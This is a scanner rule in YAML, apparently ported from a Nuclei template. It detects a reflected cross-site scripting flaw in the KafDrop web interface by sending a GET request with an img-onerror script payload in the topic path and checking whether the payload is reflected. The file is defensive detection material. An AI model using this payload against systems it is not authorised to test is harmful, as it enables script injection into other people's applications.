schema_version: 1
id: "cortex.community:kafdrop-xss"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "KafDrop - Cross-Site Scripting"
  description: "KafDrop contains a cross-site scripting vulnerability. It allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://github.com/HomeAdvisor/Kafdrop/issues/12"
    - "https://www.blackhatethicalhacking.com/news/apache-kafka-cloud-clusters-expose-sensitive-data-for-large-companies"
  cwes: [79]
  tags: ["kafdrop", "xss", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "Kafdrop" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<img src=x onerror=alert(2)>" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 500 } }
